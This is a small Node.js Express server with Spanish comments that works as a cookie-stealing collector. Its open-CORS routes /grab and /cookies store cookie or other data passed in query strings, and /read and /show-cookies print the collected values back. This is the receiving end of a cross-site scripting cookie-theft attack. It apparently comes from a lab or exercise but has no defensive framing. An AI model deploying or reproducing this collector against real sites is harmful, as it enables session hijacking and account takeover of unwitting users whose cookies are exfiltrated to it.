const express = require('express');
const bodyParser = require('body-parser'); // Se utiliza para analizar y manejar las cookies que se envían desde el cliente hasta el servido
const cors = require('cors');

const app = express();
let cookiesAlmacenadas = ""; // Variable para almacenar las cookies

app.use(cors()); // Habilita CORS
app.use(bodyParser.json());

// Ruta principal
app.get('/', (req, res) => {
    res.send('Página principal: siuuu');
});

// Ruta para grabar datos
app.get('/grab', (req, res) => {
    const data = req.query.data;
    cookiesAlmacenadas += " " + data; // Almacena los datos
    res.send(data);
});

// Ruta para leer las cookies almacenadas
app.get('/read', (req, res) => {
    res.send(cookiesAlmacenadas);
});

// Ruta para recibir y almacenar cookies
app.get('/cookies', (req, res) => {
    const cookies = req.query.cookies; // Obtener las cookies
    cookiesAlmacenadas = cookies; // Almacenar las cookies
    console.log('Cookies recibidas:', cookies);
    res.send('Cookies recibidas correctamente');
});

// Ruta para mostrar las cookies almacenadas
app.get('/show-cookies', (req, res) => {
    res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
});

// Iniciar el servidor
app.listen(3000, () => {
    console.log('Servidor funcionando en el puerto 3000');
});
